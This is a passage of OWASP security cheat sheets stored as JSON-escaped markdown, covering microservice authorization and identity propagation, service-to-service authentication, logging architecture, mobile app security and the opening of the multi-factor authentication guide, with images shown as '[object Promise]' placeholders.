tips\r\n\r\nTo define minimally needed microservice permissions analyze data collected under the following sections:\r\n\r\n- Identify and describe application-functionality services (parameter \"API definition\")\r\n- Identify \"service-to-storage\" relations\r\n- Identify \"service-to-service\" synchronous communications\r\n- Identify \"service-to-service\" asynchronous communications\r\n\r\n##### Mapping to OWASP projects\r\n\r\n- [OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.4.3](https://github.com/OWASP/ASVS/blob/master/4.0/en/0x10-V1-Architecture.md#v1-architecture-design-and-threat-modeling-requirements)\r\n\r\n#### Sensitive data identification and classification\r\n\r\n##### Implementation tips\r\n\r\nTo verify that all sensitive data is identified and classified into protection levels analyze data collected under the following sections:\r\n\r\n- Identify and describe data assets\r\n- Identify \"asset-to-storage\" relations\r\n\r\n##### Mapping to OWASP projects\r\n\r\n- [OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.8.1](https://github.com/OWASP/ASVS/blob/master/4.0/en/0x10-V1-Architecture.md#v1-architecture-design-and-threat-modeling-requirements)\r\n\r\n#### Application components business/security functions verification\r\n\r\n##### Implementation tips\r\n\r\nTo verify the definition and documentation of all application components in terms of the business or security functions they provide analyze data collected under the following sections (parameter \"Short description\"):\r\n\r\n- Identify and describe application-functionality services\r\n- Identify and describe infrastructure services\r\n\r\n##### Mapping to OWASP projects\r\n\r\n- [OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.11.1](https://github.com/OWASP/ASVS/blob/master/4.0/en/0x10-V1-Architecture.md#v1-architecture-design-and-threat-modeling-requirements)\r\n"
    },
    {
      "Microservices_Security_Cheat_Sheet.md": "# Microservices Security Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThe microservice architecture is being increasingly used for designing and implementing application systems in both cloud-based and on-premise infrastructures, high-scale applications and services. There are many security challenges need to be addressed in the application design and implementation phases. The fundamental security requirements that have to be addressed during design phase are authentication and authorization. Therefore, it is vital for applications security architects to understand and properly use existing architecture patterns to implement authentication and authorization in microservices-based systems. The goal of this cheat sheet is to identify such patterns and to do recommendations for applications security architect on possible way to use it.\r\n\r\n## Edge-level authorization\r\n\r\nIn simple scenarios, authorization can happen only at the edge level (API gateway). The API gateway can be leveraged to centralize enforcement of authorization for all downstream microservices, eliminating the need to provide authentication and access control for each of the individual services. In such cases, NIST recommends implementing mitigating controls such as mutual authentication to prevent direct, anonymous connections to the internal services (API gateway bypass). It should be noted that authorization at the edge layer has the [following limitations](https://www.youtube.com/watch?v=UnXjwCWgBKU):\r\n\r\n- Pushing all authorization decisions to the API gateway can quickly become hard to manage in complex ecosystems with many roles and access control rules.\r\n- The API gateway may become a single point of decision that may violate the “defense in depth” principle.\r\n- Operation teams typically own the API gateway, so development teams cannot directly make authorization changes, slowing down velocity due to additional communication and process overhead.\r\n  \r\nIn most cases, development teams implement authorization in both places – at the edge level at a coarse level of granularity, and at service level. To authenticate an external entity, the edge can use access tokens (referenced token or self-contained token) transmitted via HTTP headers (e.g., “Cookie” or “Authorization”) or use mTLS.\r\n\r\n## Service-level authorization\r\n\r\nService-level authorization gives each microservice more control to enforce access control policies.\r\nFor further discussion, we will use terms and definitions according with [NIST SP 800-162](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-162.pdf). The functional components of an access control system can be classified as follows:\r\n\r\n- Policy Administration Point (PAP): Provides a user interface for creating, managing, testing, and debugging access control rules.\r\n- Policy Decision Point (PDP): Computes access decisions by evaluating the applicable access control policy.\r\n- Policy Enforcement Point (PEP): Enforces policy decisions in response to a request from a subject requesting access to a protected object.\r\n- Policy Information Point (PIP): Serves as the retrieval source of attributes or the data required for policy evaluation to provide the information needed by the PDP to make decisions.\r\n\r\n[object Promise]\r\n\r\n### Service-level authorization: existing patterns\r\n\r\n#### Decentralized pattern\r\n\r\nThe development team implements PDP and PEP directly at the microservice code level. All the access control rules and attributes that need to implement that rule are defined and stored on each microservice (step 1). When a microservice receives a request along with some authorization metadata (e.g., end user context or requested resource ID), the microservice analyzes it (step 3) to generate an access control policy decision and then enforces authorization (step 4).\r\n[object Promise]\r\n\r\nExisting programming language frameworks allow development teams to implement authorization at the microservice layer. For example, [Spring Security allows](https://www.youtube.com/watch?v=v2J32nd0g24) developers to enable scopes checking (e.g., using scopes extracted from incoming JWT) in the resource server and use it to enforce authorization.\r\n\r\nImplementing authorization at the source code level means that the code must be updated whenever the development team wants to modify authorization logic.\r\n\r\n#### Centralized pattern with single policy decision point\r\n\r\nIn this pattern, access control rules are defined, stored, and evaluated centrally. Access control rules are defined using PAP (step 1) and delivered to a centralized PDP, along with attributes required to evaluate those rules (step 2). When a subject invokes a microservice endpoint (step 3), the microservice code invokes the centralized PDP via a network call, and the PDP generates an access control policy decision by evaluating the query input against access control rules and attributes (step 4). Based on the PDP decision, the microservice enforces authorization (step 5).\r\n\r\n[object Promise]\r\n\r\nTo define access control rules, development/operation teams have to use some language or notation. An example is Extensible Access Control Markup Language (XACML) and Next Generation Access Control (NGAC), which is a standard to describe policy rules.\r\n\r\nThis pattern can cause latency issues due to additional network calls to the remote PDP endpoint, but it can be mitigated by caching authorization policy decisions at the microservice level. It should be mentioned that the PDP must be operated in high-availability mode to prevent resilience and availability issues. Application security architects should combine it with other patterns (e.g., authorization on API gateway level) to enforce the \"defense in depth\" principle.\r\n\r\n#### Centralized pattern with embedded policy decision point\r\n\r\nIn this pattern, access control rules are defined centrally but stored and evaluated at the microservice level. Access control rules are defined using PAP (step 1) and delivered to an embedded PDP, along with attributes required to evaluate those rules (step 2). When a subject invokes a microservice endpoint (step 3), the microservice code invokes the PDP, and the PDP generates an access control policy decision by evaluating the query input against access control rules and attributes (step 4). Based on the PDP decision, the microservice enforces authorization (step 5).\r\n\r\n[object Promise]\r\n\r\nThe PDP code in this case, can be implemented as a microservice built-in library or sidecar in a service mesh architecture. Due to possible network/host failures and network latency, it is advisable to implement embedded PDP as a microservice library or sidecar on the same host as the microservice. Embedded PDP usually stores authorization policy and policy-related data in-memory to minimize external dependencies during authorization enforcement and get low latency. The main difference from the “Centralized pattern with single policy decision point” approach, is that authorization *decisions* do not store on the microservice side, up-to-date authorization *policy* is stored on the microservice side instead. It should be mentioned that caching authorization decisions may lead to applying outdated authorization rules and access control violations.\r\n\r\nNetflix presented ([link](https://www.youtube.com/watch?v=R6tUNpRpdnY), [link](https://conferences.oreilly.com/velocity/vl-ca-2018/public/schedule/detail/66606.html)) a real case of using “Centralized pattern with embedded PDP” pattern to implement authorization on the microservices level.\r\n\r\n[object Promise]\r\n\r\n- The Policy portal and Policy repository are UI-based systems for creating, managing, and versioning access control rules.\r\n- The Aggregator fetches data used in access control rules from all external sources and keeps it up to date.\r\n- The Distributor pulls access control rules (from the Policy repository) and data used in access control rules (from Aggregators) to distribute them among PDPs.\r\n- The PDP (library) asynchronously pulls access control rules and data and keeps them up to date to enforce authorization by the PEP component.\r\n\r\n### Recommendations on how to implement authorization\r\n\r\n1. To achieve scalability, it is not advisable to hardcode authorization policy in source code (decentralized pattern) but use a special language to express policy instead. The goal is to externalize/decouple authorization from code, and not just with a gateway/proxy acting as a checkpoint. The recommended pattern for service-level authorization is \"Centralized pattern with embedded PDP\" due to its resilience and wide adoption.\r\n2. The authorization solution should be a platform-level solution; a dedicated team (e.g., Platform security team) must be accountable for the development and operation of the authorization solution as well as sharing microservice blueprint/library/components that implement authorization among development teams.\r\n3. The authorization solution should be based on widely-used solutions because implementing a custom solution has the following cons:\r\n    - Security or engineering teams have to build and maintain a custom solution.\r\n    - It is necessary to build and maintain client library SDKs for every language used in the system architecture.\r\n    - There is a necessity to train every developer on custom authorization service API and integration, and there’s no open-source community to source information from.\r\n4. There is a probability that not all access control policies can be enforced by gateways/proxies and shared authorization library/components, so some specific access control rules still have to be implemented on microservice business code level. In order to do that, it is advisable to have microservice development teams use simple questionnaires/check-lists to uncover such security requirements and handle them properly during microservice development.\r\n5. It is advisable to implement the “defense in depth” principle and enforce authorization on:\r\n    - Gateway and proxy level, at a coarse level of granularity.\r\n    - Microservice level, using shared authorization library/components to enforce fine-granted decisions.\r\n    - Microservice business code level, to implement business-specific access control rules.\r\n6. Formal procedures on access control policy must be implemented on development, approval and rolling-out.\r\n\r\n## External Entity Identity Propagation\r\n\r\nTo make fine-grained authorization decisions at the microservice level, a microservice has to understand the caller’s context (e.g., user ID, user roles/groups). In order to allow the internal service layer to enforce authorization, the edge layer has to propagate an authenticated external entity identity (e.g., end user context) along with a request to downstream microservices. One of the simplest ways to propagate external entity identity is to reuse the access token received by the edge and pass it to internal microservices. However, it should be mentioned that this approach is highly insecure due to possible external access token leakage and may increase an attack surface because the communication relies on a proprietary token-based system implementation. If an internal service is unintentionally exposed to the external network, then it can be directly accessed using the leaked access token. This attack is not possible if the internal service only accepts a token format known only to internal services. This pattern is also not external access token agnostic, i.e., internal services have to understand external access tokens and support a wide range of authentication techniques to extract identity from different types of external tokens (e.g., JWT, cookie, OpenID Connect token).\r\n\r\n### Identity propagation: existing patterns\r\n\r\n#### Sending the external entity identity as clear or self-signed data structures\r\n\r\nIn this approach, the microservice extracts the external entity identity from the incoming request (e.g., by parsing the incoming access token), creates a data structure (e.g., JSON or self-signed JWT) with that context, and passes it on to an internal microservice.\r\nIn this scenario, the recipient microservice has to trust the calling microservice. If the calling microservice wants to violate access control rules, it can do so by setting any user/client ID or user roles it wants in the HTTP header. This approach is suitable only in highly trusted environments where every microservice is developed by a trusted development team that applies secure software development practices.\r\n\r\n#### Using a data structures signed by a trusted issuer\r\n\r\nIn this pattern, after the external request is authenticated by the authentication service at the edge layer, a data structure representing the external entity identity (e.g., containing user ID, user roles/groups, or permissions) is generated, signed, or encrypted by the trusted issuer and propagated to internal microservices.\r\n[object Promise]\r\n\r\n[Netflix presented](https://www.infoq.com/presentations/netflix-user-identity/) a real-world case of using that pattern: a structure called “Passport” that contains the user ID and its attributes and which is HMAC protected at the edge level for each incoming request. This structure is propagated to internal microservices and never exposed outside.\r\n\r\n1. The Edge Authentication Service (EAS) obtains a secret key from the Key Management System.\r\n2. EAS receives an access token (e.g., in a cookie, JWT, OAuth2 token) from the incoming request.\r\n3. EAS decrypts the access token, resolves the external entity identity, and sends it to the internal services in the signed “Passport” structure.\r\n4. Internal services can extract user identity to enforce authorization (e.g., to implement identity-based authorization) using wrappers.\r\n5. If necessary, internal service can propagate the “Passport” structure to downstream services in the call chain.\r\n\r\n[object Promise]\r\nIt should be mentioned that the pattern is external access token agnostic and allows for decoupling of external entities from their internal representations.\r\n\r\n### Recommendation on how to implement identity propagation\r\n\r\n1. In order to implement an external access token agnostic and extendable system, decouple the access tokens issued for an external entity from its internal representation. Use a single data structure to represent and propagate the external entity identity among microservices. The edge-level service has to verify the incoming external access token, issue an internal entity representation structure, and propagate it to downstream services.\r\n2. Using an internal entity representation structure signed (symmetric or asymmetric encryption) by a trusted issuer is a recommended pattern adopted by the community.\r\n3. The internal entity representation structure should be extensible to enable adding more claims that may lead to low latency.\r\n4. The internal entity representation structure must not be exposed outside (e.g., to a browser or external device)\r\n\r\n## Service-to-service authentication\r\n\r\n### Existing patterns\r\n\r\n#### Mutual transport layer security\r\n\r\nWith an mTLS approach, each microservice can legitimately identify who it talks to, in addition to achieving confidentiality and integrity of the transmitted data. Each microservice in the deployment has to carry a public/private key pair and use that key pair to authenticate to the recipient microservices via mTLS. mTLS is usually implemented with a self-hosted Public Key Infrastructure. The main challenges of using mTLS are key provisioning and trust bootstrap, certificate revocation, and key rotation.\r\n\r\n#### Token-based\r\n\r\nThe token-based approach works at the application layer. A token is a container that may contain the caller ID (microservice ID) and its permissions (scopes). The caller microservice can obtain a signed token by invoking a special security token service using its own service ID and password and then attaches it to every outgoing request, e.g., via HTTP headers. The called microservice can extract the token and validate it online or offline.\r\n[object Promise]\r\n\r\n1. Online scenario:\r\n    - To validate incoming tokens, the microservice invokes a centralized service token service via network call.\r\n    - Revoked (compromised) tokens can be detected.\r\n    - High latency.\r\n    - Should be applied to critical requests.\r\n2. Offline scenario:\r\n    - To validate incoming tokens, the microservice uses the downloaded service token service public key.\r\n    - Revoked (compromised) tokens may not be detected.\r\n    - Low latency.\r\n    - Should be applied to non-critical requests.\r\nIn most cases, token-based authentication works over TLS, which provides confidentiality and integrity of data in transit.\r\n\r\n## Logging\r\n\r\nLogging services in microservice-based systems aim to meet the principles of accountability and traceability and help detect security anomalies in operations via log analysis. Therefore, it is vital for application security architects to understand and adequately use existing architecture patterns to implement audit logging in microservices-based systems for security operations. A high-level architecture design is shown in the picture below and is based on the following principles:\r\n\r\n- Each microservice writes a log message to a local file using standard output (via stdout, stderr).\r\n- The logging agent periodically pulls log messages and sends (publishes) them to the message broker (e.g., NATS, Apache Kafka).\r\n- The central logging service subscribes to messages in the message broker, receives them, and processes them.\r\n[object Promise]\r\n\r\nHigh-level recommendations to logging subsystem architecture with its rationales are listed below.\r\n\r\n1. Microservice shall not send log messages directly to the central logging subsystem using network communication. Microservice shall write its log message to a local log file:\r\n    - this allows to mitigate the threat of data loss due to logging service failure due to attack or in case of its flooding by legitimate microservice: in case of logging service outage, microservice will still write log messages to the local file (without data loss), after logging service recovery logs will be available to shipping;\r\n2. There shall be a dedicated component (logging agent) decoupled from the microservice. The logging agent shall collect log data on the microservice  (read local log file) and send it to the central logging subsystem. Due to possible network latency issues, the logging agent shall be deployed on the same host (virtual or physical machine) with the microservice:\r\n    - this allows mitigating the threat of data loss due to logging service failure due to attack or in case of its flooding by legitimate microservice\r\n    - in case of logging agent failure, microservice still writes information to the log file, logging agent after recovery will read the file and send information to message broker;\r\n3. A possible DoS attack on the central logging subsystem logging agent shall not use an asynchronous request/response pattern to send log messages. There shall be a message broker to implement the asynchronous connection between the logging agent and central logging service:\r\n    - this allows to mitigate the threat of data loss due to logging service failure in case of its flooding by legitimate microservice\r\n    - in case of logging service outage, microservice will still write log messages to the local file (without data loss) after logging service recovery logs will be available to shipping;\r\n4. Logging agent and message broker shall use mutual authentication (e.g., based on TLS) to encrypt all transmitted data (log messages) and authenticate themselves:\r\n    - this allows mitigating threat: microservice spoofing, logging/transport system spoofing, network traffic injection, sniffing network traffic\r\n5. Message broker shall enforce access control policy to mitigate unauthorized access and implement the principle of least privileges:\r\n    - this allows mitigating the threat of microservice elevation of privileges\r\n6. Logging agent shall filter/sanitize output log messages to sensitive data (e.g., PII, passwords, API keys) will never send to the central logging subsystem (data minimization principle). For a comprehensive overview of items that should be excluded from logging, please see the [OWASP Logging Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Logging_Cheat_Sheet.md#data-to-exclude).\r\n7. Microservices shall generate a correlation ID that uniquely identifies every call chain and helps group log messages to investigate them. The logging agent shall include a correlation ID in every log message.\r\n8. The logging agent shall periodically provide health and status data to indicate its availability or non-availability.\r\n9. The logging agent shall publish log messages in a structured logs format (e.g., JSON, CSV).\r\n10. The logging agent shall append log messages with context data, e.g., platform context (hostname, container name), runtime context (class name, filename).\r\n\r\nFor a comprehensive overview of events that should be logged and possible data format, please see the [OWASP Logging Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Logging_Cheat_Sheet.md#which-events-to-log) and [Application Logging Vocabulary Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Logging_Vocabulary_Cheat_Sheet.md)\r\n\r\n## References\r\n\r\n- [NIST Special Publication 800-204](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204.pdf) “Security Strategies for Microservices-based Application Systems”\r\n- [NIST Special Publication 800-204A](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204A.pdf) “Building Secure Microservices-based Applications Using Service-Mesh Architecture”\r\n- [Microservices Security in Action](https://www.manning.com/books/microservices-security-in-action), Prabath Siriwardena and Nuwan Dias, 2020, Manning\r\n"
    },
    {
      "Mobile_Application_Security_Cheat_Sheet.md": "# Mobile Application Security Cheat Sheet\r\n\r\nMobile application development presents certain security challenges that are\r\nunique compared to web applications and other forms of software. This cheat\r\nsheet provides guidance on security considerations for mobile app development.\r\nIt is not a comprehensive guide by any means, but rather a starting point for\r\ndevelopers to consider security in their mobile app development.\r\n\r\n## Architecture & Design\r\n\r\n### 1. Secure by Design\r\n\r\n- Opt for a secure design at the beginning of development, not as an\r\n  afterthought.\r\n- Keep in mind security principles like least privilege, defense in depth, and\r\n  separation of concerns.\r\n- Follow industry standards and best practices, such as:\r\n    - National Institute of Standards and Technology (NIST)\r\n    - Internet Engineering Task Force (IETF)\r\n\r\nFor more information, see the\r\n[Secure Product Design Cheat Sheet](Secure_Product_Design_Cheat_Sheet.md).\r\n\r\n### 2. Secure APIs\r\n\r\n- Ensure that your mobile app communicates securely with backend services.\r\n- Use OAuth2, JWT, or similar for secure authentication.\r\n- Regularly update and rotate any used API keys or tokens.\r\n\r\n### 3. Principle of Least Privilege\r\n\r\n- Request only the permissions your app needs.\r\n- This applies not only to device permissions granted by the user, but also to\r\n  permissions granted to the app by backend services.\r\n- Avoid storing application files with overly permissive permissions.\r\n- Secure by default: applications should have the most secure settings by default.\r\n\r\n### 4. Supply Chain\r\n\r\nDeveloping with third-party libraries and components introduces the possibility\r\nof security unknowns.\r\n\r\n- Ensure app signing.\r\n- Use only trusted and validated third-party libraries & components.\r\n- Establish security controls for app updates, patches, and releases.\r\n- Monitor and detect security incidents of used third-party products.\r\n\r\nSee the [Vulnerable Dependency Management Cheat Sheet](Vulnerable_Dependency_Management_Cheat_Sheet.md)\r\nfor recommendations on managing third-party dependencies when vulnerabilities are discovered.\r\n\r\n## Authentication & Authorization\r\n\r\nAuthentication is a complex topic and there are many pitfalls. Authentication\r\nlogic must be written and tested with extreme care. The tips here are only a\r\nstarting point and barely scratch the surface. For more information, see the\r\n[Authentication Cheat Sheet](Authentication_Cheat_Sheet.md) and\r\n[M1: Insecure Authentication/Authorization](https://owasp.org/www-project-mobile-top-10/2023-risks/m1-insecure-authentication-authorization.html) from the OWASP Mobile Top 10.\r\n\r\n### 1. Don't Trust the Client\r\n\r\n- Perform authentication/authorization server-side and only load data on the device after successful authentication.\r\n- If storing data locally, encrypt it using a key derived from the user’s login credentials.\r\n- Do not store user passwords on the device; use device-specific tokens that can be revoked.\r\n- Avoid using spoofable values like device identifiers for authentication.\r\n- Assume all client-side controls can be bypassed and perform them server-side as well.\r\n- Include client side code to detect code/binary tampering.\r\n\r\n### 2. Credential Handling\r\n\r\n- Do not hardcode credentials in the mobile app.\r\n- Encrypt credentials in transmission.\r\n- Do not store user credentials on the device. Consider using secure, revocable access tokens.\r\n\r\n### 3. Passwords and PIN Policy\r\n\r\n- Require password complexity.\r\n- Do not allow short PINs such as 4 digits.\r\n- Use platform specific secure storage mechanisms, such as Keychain (iOS) or Keystore (Android).\r\n\r\n### 4. Biometric Authentication\r\n\r\n- Use platform-supported methods for biometric authentication.\r\n- Always provide a fallback, such as a PIN.\r\n\r\n### 5. Session Management\r\n\r\n- Sessions should timeout after inactivity.\r\n- Offer a remote logout feature.\r\n- Use randomly generated session tokens.\r\n- Secure session data, both client and server side.\r\n\r\n### 6. Token Storage\r\n\r\n- Store authentication tokens securely.\r\n- Handle token expiration gracefully.\r\n\r\n### 7. Sensitive Operations\r\n\r\n- Require users to re-authenticate for sensitive operations like changing\r\n  passwords or updating payment information.\r\n- Consider requring re-authentication before displaying highly sensitive\r\n  information as well.\r\n- Require authorization checks on any backend functionality.\r\n\r\n## Data Storage & Privacy\r\n\r\n### 1. Data Encryption\r\n\r\n- Encrypt sensitive data both at rest and in transit.\r\n- Store private data on the device's internal storage.\r\n- Use platform APIs for encryption. Do not attempt to implement your own\r\n  encryption algorithms.\r\n\r\n### 2. Data Leakage\r\n\r\n- Beware of caching, logging, and background snapshots. Ensure that sensitive\r\n  data is not leaked through these mechanisms.\r\n\r\nSee the [Logging Cheat Sheet](Logging_Cheat_Sheet.md#data-to-exclude) for\r\nexamples of data that should not be logged.\r\n\r\n### 3. Use HTTPS\r\n\r\n- Always use HTTPS for network communications.\r\n\r\n### 4. Third-Party Libraries\r\n\r\n- Ensure all third-party libraries are secure and up to date.\r\n\r\n### 5. Personally Identifiable Information (PII)\r\n\r\n- Minimise any PII to neccessity.\r\n- Attempt to replace PII with less critical information if possible.\r\n- Reduce PII, e.g. less frequent location updates.\r\n- Implement automatic expiration and deletion of PII to minimize retention.\r\n- Ask for user consent before collecting or using PII.\r\n\r\n## Network Communication\r\n\r\n### 1. Don't Trust the Network\r\n\r\n- Assume that all network communication is insecure and can be intercepted.\r\n\r\n### 2. Use Secure Protocols\r\n\r\n- Use HTTPS for all network communication.\r\n- Do not override SSL certificate validation to allow self-signed or invalid\r\n  certificates.\r\n- Avoid mixed version SSL sessions.\r\n- Encrypt data even if sent over SSL, in case of future SSL vulnerabilities.\r\n- Use strong, industry standard cipher suites, with appropriate key lengths.\r\n- Use certificates signed by a trusted CA provider\r\n- Avoid sending sensitive data via SMS.\r\n\r\n### 3. Certificate Pinning\r\n\r\n- Consider certificate pinning. See the [Pinning Cheat Sheet](Pinning_Cheat_Sheet.md)\r\n  for pros and cons of this approach.\r\n\r\n## User Interface\r\n\r\n### 1. UI Data Masking\r\n\r\n- Mask sensitive information on UI fields to prevent shoulder surfing.\r\n\r\n### 2. User Notifications\r\n\r\n- Inform the user about security-related activities, such as logins from new\r\n  devices.\r\n\r\n### 3. Input Validation\r\n\r\n- Validate and sanitize user input. See the\r\n  [Input Validation Cheat Sheet](Input_Validation_Cheat_Sheet.md) for more\r\n  information.\r\n\r\n### 4. Output Validation\r\n\r\n- Validate and sanitize output to prevent injection and execution attacks.\r\n\r\n## Code Quality\r\n\r\n### 1. Static Analysis\r\n\r\n- Use static analysis tools to identify vulnerabilities.\r\n\r\n### 2. Code Reviews\r\n\r\n- Make security a focal point during code reviews.\r\n\r\n### 3. Update Libraries\r\n\r\n- Keep all your libraries up to date to patch known vulnerabilities.\r\n\r\n## Application Integrity\r\n\r\n- Disable debugging.\r\n- Include code to validate integrity of application code.\r\n- Obfuscate the app binary.\r\n\r\n## Testing\r\n\r\n### 1. Penetration Testing\r\n\r\n- Perform ethical hacking to identify vulnerabilities.\r\n- Example tests:\r\n    - Cryptographic vulnerability assessment.\r\n    - Attempt to execute backend server functionality anonymously by removing any session tokens from POST/GET requests.\r\n\r\n### 2. Automated Tests\r\n\r\n- Leverage automated tests to ensure that security features are working as\r\n  expected and that access controls are enforced.\r\n\r\n### 3. Usability Testing\r\n\r\n- Ensure that security features do not harm usability, which could cause users\r\n  to bypass security features.\r\n\r\n## Post-Deployment\r\n\r\n### 1. Incident Response\r\n\r\n- Have a clear incident response plan in place.\r\n\r\n### 2. Updates\r\n\r\n- Plan for regular updates and patches. In the case of mobile apps, this is\r\n  especially important due to the delay between when a patch is released and\r\n  when users actually receive the updated version due to app store review\r\n  processes and the time it takes for users to update their apps.\r\n\r\n- Use a mechanism to force users to update their app version when necessary.\r\n\r\n### 3. Monitoring and Analytics\r\n\r\n- Use real-time monitoring to detect and respond to threats.\r\n\r\n## Platform-Specific Guidance\r\n\r\n### Android\r\n\r\n- Use Android’s ProGuard for code obfuscation.\r\n- Avoid storing sensitive data in SharedPreferences. See the\r\n  [Android docs](https://developer.android.com/topic/security/data)\r\n  on working with data securely for more details.\r\n- Disable backup mode to prevent sensitive data being stored in backups.\r\n\r\n### iOS\r\n\r\n- Use ATS (App Transport Security) to enforce strong security policies for\r\n  network communication.\r\n- Do not store sensitive data in plist files.\r\n\r\nFor further reading, visit the\r\n[OWASP Mobile Top 10 Project](https://owasp.org/www-project-mobile-top-10/).\r\nFor a more detailed framework for mobile security, see the\r\n[OWASP Mobile Application Security Project](https://mas.owasp.org/).\r\n"
    },
    {
      "Multifactor_Authentication_Cheat_Sheet.md": "# Multi-Factor Authentication Cheat Sheet\r\n\r\n## Introduction\r\n\r\nMulti-Factor authentication (MFA), or Two-Factor Authentication (2FA) is when a user is required to present more than one type of evidence in order to authenticate on a system. There are four different types of evidence (or factors) that can be used, listed in the table below:\r\n\r\n| Factor | Examples |\r\n|--------|----------|\r\n| Something You Know | Passwords, PINs and security questions. |\r\n| Something You Have | Hardware or software tokens, certificates, email, SMS and phone calls. |\r\n| Something You Are | Fingerprints, facial recognition, iris scans and handprint scans. |\r\n| Location | Source IP ranges and geolocation |\r\n\r\nIt should be emphasised that while requiring multiple examples of a single factor (such as needing both a password and a PIN) **does not constitute MFA**, although it may provide some security benefits over a simple password.\r\n\r\nAdditionally, while the following sections discuss the disadvantage and weaknesses of various different types of MFA, in many cases these are only relevant against targeted attacks. **Any MFA is better than no MFA**.\r\n\r\n## Advantages\r\n\r\nThe most common way that user accounts get compromised on applications is through weak, re-used or stolen passwords. Despite any technical security controls implemented on the application, users are liable to choose weak passwords, or to use the same password on different applications. As developers or system administrators, it should be assumed that users' passwords will be compromised at some point, and the system should be designed in order to defend against this.\r\n\r\nMulti-factor authentication (MFA) is by far the best defense against the majority of password-related attacks, including brute-force, [credential stuffing](Credential_Stuffing_Prevention_Cheat_Sheet.md) and password spraying, with analysis by Microsoft suggesting that it would have stopped [99.9% of account compromises](https://techcommunity.microsoft.com/t5/Azure-Active-Directory-Identity/Your-Pa-word-doesn-t-matter/ba-p/731984).\r\n\r\n## Disadvantages\r\n\r\nThe biggest disadvantage of MFA is the increase in management complexity for both administrators and end users. Many less technical users may find it difficult to configure and use MFA. Additionally, there are a number of other common issues encountered:\r\n\r\n- Types of MFA that require users to have specific hardware can introduce significant costs and administrative overheads.\r\n- Users may become locked out of their accounts if they lose or are unable to use their other factors.\r\n- MFA introduces additional complexity into the application.\r\n- Many MFA solutions add external dependencies to systems, which can introduce security vulnerabilities or single points of failure.\r\n- Processes implemented to allow users to bypass or reset MFA may be exploitable by attackers.\r\n- Requiring MFA may prevent some users from accessing the application.\r\n\r\n## Quick Recommendations\r\n\r\nExactly when and how MFA is implemented in an application will vary on a number of different factors, including the threat model of the application, the technical level of the users, and the level of administrative control over the users. These need to be considered on a per-application basis.\r\n\r\nHowever, the following recommendations are generally appropriate for most applications, and provide an initial starting point to consider.\r\n\r\n- Provide the option for users to enable MFA on their accounts using [TOTP](#software-totp-tokens).\r\n- Require MFA for administrative or other high privileged users.\r\n- Consider allowing corporate IP ranges so that MFA is not required from them.\r\n- Allow the user to remember the use of MFA in their browser, so they are not prompted every time they login.\r\n- Implement a secure process to allow users to reset their MFA.\r\n\r\n## Implementing MFA\r\n\r\n### When to Require MFA\r\n\r\nThe most important place to require MFA on an application is when the user logs in. However, depending on the functionality available, it may also be appropriate to require MFA for performing sensitive actions, such as:\r\n\r\n- Changing passwords or security questions.\r\n- Changing the email address associated with the account.\r\n- Disabling MFA.\r\n- Elevating a user session to an administrative session.\r\n\r\nIf the application provides multiple ways for a user to authenticate these should all require MFA, or have other protections implemented. A common area that is missed is if the application provides a separate API that can be used to login, or has an associated mobile application.\r\n\r\n### Improving Usability\r\n\r\nHaving to frequently login with MFA creates an additional burden for users, and may cause them to disable MFA on the application. A number of mechanisms can be used to try and reduce the level of annoyance that MFA causes. However, these types of measures do decrease the security provided by MFA, so need to be risk assessed to find a reasonable balance of security and usability for the application.\r\n\r\n- Remembering the user's browser so they don't need to use MFA every time.\r\n    - This can either be permanent, or for a period of a few days.\r\n    - This needs to be done with more than just a cookie, which could be stolen by an attacker.\r\n        - For example, a cookie matched to the previous IP address the cookie was issued for.\r\n- Allow corporate IP ranges (or, more strictly, using location as a second factor).\r\n    - This doesn't protect against malicious insiders, or a user's workstation being compromised.\r\n- Only requiring MFA for sensitive actions, not for the initial login.\r\n    - This will depend heavily on the functionality in the application.\r\n\r\n### Failed Login Attempts\r\n\r\nWhen a user enters their password, but fails to authenticate using a second factor, this could mean one of two things:\r\n\r\n- The user has lost their second factor, or doesn't have it available (for example, they don't have their mobile phone, or have no signal).\r\n- The user's password has been compromised.\r\n\r\nThere are a number of steps that should be taken when this occurs:\r\n\r\n- Prompt the user to try another form of MFA\r\n    - For example, an SMS code rather than using their hardware OTP token.\r\n- Allow the user to attempt to [reset their MFA](#resetting-mfa).\r\n- Notify the user of the failed login attempt, and encourage them to change their password if they don't recognize it.\r\n    - The notification should include the time, browser and geographic location of the login attempt.\r\n    - This should be displayed next time they login, and optionally emailed to them as well.\r\n\r\n### Resetting MFA\r\n\r\nOne of the biggest challenges with implementing MFA is handling users who forget or lose their second factors. There are many ways this could happen, such as:\r\n\r\n- Re-installing a workstation without backing up digital certificates.\r\n- Wiping or losing a phone without backing up OTP codes.\r\n- Changing mobile numbers.\r\n\r\nIn order to prevent users from being locked out of the application, there needs to be a mechanism for them to regain access to their account if they can't use their existing MFA; however it is also crucial that this doesn't provide an attacker with a way to bypass MFA and hijack their account.\r\n\r\nThere is no definitive \"best way\" to do this, and what is appropriate will vary hugely based on the security of the application, and also the level of control over the users. Solutions that work for a corporate application where all the staff know each other are unlikely to be feasible for a publicly available application with thousands of users all over the world. Every recovery method has its own advantages and disadvantages, and these need to be evaluated in the context of the application.\r\n\r\nSome suggestions of possible methods include:\r\n\r\n- Providing the user with a number of single-use recovery codes when they first setup MFA.\r\n- Requiring the user to setup multiple types of MFA (such as a digital certificate, OTP core and phone number for SMS), so that they are unlikely to lose access to all of them at once.\r\n- Posting a one-use recovery code (or new hardware token) to the user.\r\n- Requiring the user contact the support team and having a rigorous process in place to verify their identity.\r\n- Requiring another trusted user to vouch for them.\r\n\r\n## Something You Know\r\n\r\nThe most common type of authentication is based on something the users knows - typically a password. The biggest advantage of this factor is that it has very low requirements for both the developers and the end user, as it does not require any special hardware, or integration with other services.\r\n\r\n### Passwords and PINs\r\n\r\nPasswords and PINs are the most common form of authentication due to the simplicity of implementing them. The [Authentication Cheat 